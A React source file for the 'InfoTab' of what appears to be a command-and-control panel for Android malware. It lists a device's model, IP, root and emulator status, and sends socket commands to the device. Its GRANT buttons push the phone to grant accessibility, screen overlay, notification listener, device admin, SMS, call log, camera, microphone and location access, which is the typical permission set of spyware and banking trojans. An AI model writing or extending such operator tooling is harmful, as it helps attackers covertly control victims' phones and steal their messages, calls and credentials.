import { useState, useEffect } from 'react';
import { subscribeType } from '../../lib/socket';

export default function InfoTab({ device, send }) {
  const [info,  setInfo]  = useState(device.info || {});
  const [perms, setPerms] = useState(device.permissions || {});

  // Live updates
  useEffect(() => {
    const unsub1 = subscribeType(device.id, 'DEVICE_INFO', (msg) => {
      setInfo(msg.info || msg);
      if (msg.info?.permissions) setPerms(msg.info.permissions);
    });
    const unsub2 = subscribeType(device.id, 'permission_update', (msg) => {
      setPerms(p => ({ ...p, ...(msg.permissions || {}) }));
    });
    const unsub3 = subscribeType(device.id, 'accessibility_status', (msg) => {
      setPerms(p => ({ ...p, accessibility: msg.active }));
    });
    // Request fresh info on mount
    send('GET_DEVICE_INFO');
    send('CHECK_PERMISSIONS');
    return () => { unsub1(); unsub2(); unsub3(); };
  }, [device.id]);

  const fields = [
    ['Model',        info.model        || device.model || '—'],
    ['Manufacturer', info.manufacturer || device.manufacturer || '—'],
    ['Android',      info.android_version || device.android_version || '—'],
    ['SDK',          info.sdk_int      || '—'],
    ['Device ID',    device.id],
    ['IP',           device.ip         || '—'],
    ['Battery',      info.battery_level != null ? `${info.battery_level}%` : '—'],
    ['RAM Free',     info.ram_free      ? fmtBytes(info.ram_free)  : '—'],
    ['Storage Free', info.storage_free  ? fmtBytes(info.storage_free) : '—'],
    ['Locale',       info.locale        || '—'],
    ['Timezone',     info.timezone      || '—'],
    ['Root',         info.rooted != null ? (info.rooted ? 'YES' : 'no') : '—'],
    ['Emulator',     info.emulator != null ? (info.emulator ? 'YES' : 'no') : '—'],
  ];

  const permDefs = [
    { key: 'accessibility',       label: 'Accessibility',         cmd: 'REQUEST_PERMISSION', arg: 'accessibility' },
    { key: 'overlay',             label: 'Overlay',               cmd: 'REQUEST_OVERLAY_PERMISSION' },
    { key: 'notification_access', label: 'Notification Listener', cmd: 'REQUEST_PERMISSION', arg: 'notification_access' },
    { key: 'battery_optimization',label: 'Battery Opt. Exempt',   cmd: 'REQUEST_IGNORE_BATTERY' },
    { key: 'device_admin',        label: 'Device Admin',          cmd: 'REQUEST_ADMIN_PERMISSION' },
    { key: 'camera',              label: 'Camera',                cmd: 'REQUEST_PERMISSION', arg: 'camera' },
    { key: 'microphone',          label: 'Microphone',            cmd: 'REQUEST_PERMISSION', arg: 'microphone' },
    { key: 'location',            label: 'Location',              cmd: 'REQUEST_PERMISSION', arg: 'location' },
    { key: 'contacts',            label: 'Contacts',              cmd: 'REQUEST_PERMISSION', arg: 'contacts' },
    { key: 'sms',                 label: 'SMS',                   cmd: 'REQUEST_PERMISSION', arg: 'sms' },
    { key: 'call_log',            label: 'Call Log',              cmd: 'REQUEST_PERMISSION', arg: 'call_log' },
    { key: 'storage',             label: 'Storage',               cmd: 'REQUEST_PERMISSION', arg: 'storage' },
  ];

  return (
    <div style={S.root}>

      {/* Action bar */}
      <div style={S.bar}>
        <Btn onClick={() => { send('GET_DEVICE_INFO'); send('CHECK_PERMISSIONS'); }}>REFRESH</Btn>
        <Btn onClick={() => send('CONFIGURE_ROM')}>ROM CONFIG</Btn>
        <Btn onClick={() => send('RECONNECT_CONNECTION')} color="#7b61ff">RECONNECT</Btn>
        <Btn onClick={() => send('PING')} color="#f5a623">PING</Btn>
      </div>

      <div style={S.cols}>

        {/* Device info */}
        <div style={S.section}>
          <div style={S.sectionTitle}>DEVICE INFO</div>
          {fields.map(([k, v]) => (
            <div key={k} style={S.row}>
              <span style={S.key}>{k}</span>
              <span style={S.val}>{v}</span>
            </div>
          ))}
        </div>

        {/* Permissions */}
        <div style={S.section}>
          <div style={S.sectionTitle}>PERMISSIONS</div>
          {permDefs.map(({ key, label, cmd, arg }) => {
            const granted = !!perms[key];
            return (
              <div key={key} style={S.permRow}>
                <div style={S.permDot(granted)} />
                <span style={{ ...S.permLabel, color: granted ? '#ddd' : '#666' }}>{label}</span>
                {!granted && (
                  <button
                    style={S.grantBtn}
                    onClick={() => send(arg ? { type: cmd, permission: arg } : { type: cmd })}
                  >
                    GRANT
                  </button>
                )}
                {granted && <span style={S.granted}>✓</span>}
              </div>
            );
          })}
          <div style={{ marginTop: 10 }}>
            <Btn onClick={() => send('CHECK_ADMIN_STATUS')} color="#f5a623">CHECK ADMIN</Btn>
          </div>
        </div>
      </div>
    </div>
  );
}

function fmtBytes(b) {
  if (b > 1e9) return (b / 1e9).toFixed(1) + ' GB';
  if (b > 1e6) return (b / 1e6).toFixed(0) + ' MB';
  return (b / 1e3).toFixed(0) + ' KB';
}

function Btn({ onClick, children, color }) {
  const c = color || '#00d26a';
  return (
    <button onClick={onClick} style={{
      background: 'transparent', border: `1px solid ${c}55`,
      color: c, fontSize: 11, padding: '4px 10px', borderRadius: 4,
      cursor: 'pointer', fontFamily: 'inherit',
    }}>{children}</button>
  );
}

const S = {
  root: { display: 'flex', flexDirection: 'column', gap: 14 },
  bar:  { display: 'flex', gap: 8, flexWrap: 'wrap' },
  cols: { display: 'flex', gap: 24, flexWrap: 'wrap', alignItems: 'flex-start' },
  section: {
    flex: 1, minWidth: 220,
    background: '#0d0d18', border: '1px solid #1a1a24',
    borderRadius: 6, padding: '12px 14px',
    display: 'flex', flexDirection: 'column', gap: 2,
  },
  sectionTitle: {
    fontSize: 9, color: '#333', letterSpacing: 1.5,
    textTransform: 'uppercase', marginBottom: 8,
  },
  row:  { display: 'flex', gap: 8, padding: '3px 0', borderBottom: '1px solid #12121e' },
  key:  { fontSize: 11, color: '#444', width: 110, flexShrink: 0 },
  val:  { fontSize: 11, color: '#bbb', fontFamily: 'monospace', overflow: 'hidden', textOverflow: 'ellipsis' },
  permRow: {
    display: 'flex', alignItems: 'center', gap: 8,
    padding: '5px 0', borderBottom: '1px solid #12121e',
  },
  permDot: (ok) => ({
    width: 7, height: 7, borderRadius: '50%', flexShrink: 0,
    background: ok ? '#00d26a' : '#2a2a3a',
    boxShadow: ok ? '0 0 4px #00d26a66' : 'none',
  }),
  permLabel: { fontSize: 11, flex: 1 },
  grantBtn: {
    background: 'transparent', border: '1px solid #334',
    color: '#f5a623', fontSize: 9, padding: '2px 7px', borderRadius: 3,
    cursor: 'pointer', fontFamily: 'monospace', letterSpacing: .5,
  },
  granted: { fontSize: 11, color: '#00d26a', marginLeft: 'auto' },
};
